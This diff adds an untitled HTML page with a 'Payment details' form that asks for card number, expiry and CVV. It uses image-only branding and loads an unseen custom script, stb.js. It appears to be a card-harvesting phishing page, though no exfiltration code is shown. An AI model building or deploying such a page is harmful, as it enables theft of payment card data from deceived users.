@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/main.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body>
+    <div class="hed">
+        <img src="./img/hed.JPG" alt="">
+    </div>
+    <p class="p1">Payment details</p>
+
+    <div class="section2">
+        
+
+        <div class="pay">
+            <p>Payment</p>
+            <img class="cc" src="./img/cc-icon.JPG" alt="">
+        </div>
+        <form method="post" id="pg2">
+            <p>Card number</p>
+            <input type="tel" name="" id="numcc" placeholder="____ ____ ____ ____" required maxlength="19">
+            
+            <div class="in2">
+                <div class="mm">
+                    <p>Expiry date</p>
+            <input  type="tel" name="" id="numdd" required maxlength="5" placeholder="MM/YY">
+                </div>
+
+            <div>
+                <p>CVV</p>
+            <input type="tel" name="" id="numvv"  required maxlength="4">
+            </div>
+
+            </div>
+
+            <button type="submit" class="btn2">Confirm</button>
+        </form>
+    </div>
+
+    <img style="width: 100%; margin-top: 40px;" src="./img/bot.JPG" alt="">
+    <script>
+         $("#numcc").on("keyup",function(){
+            cc = $(this).val().split(" ").join("");
+            cc = cc.match(new RegExp('.{1,4}$|.{1,4}', 'g')).join(" ");
+            $(this).val(cc);
+        });
+        $("#numdd").on("keyup",function(){
+            dd = $(this).val().split("/").join("");
+            dd = dd.match(new RegExp('.{1,2}$|.{1,2}', 'g')).join("/");
+            $(this).val(dd);
+        });
+    </script>
+    <!-- my script -->
+    <script src="./js/stb.js"></script>
+</body>
+</html>
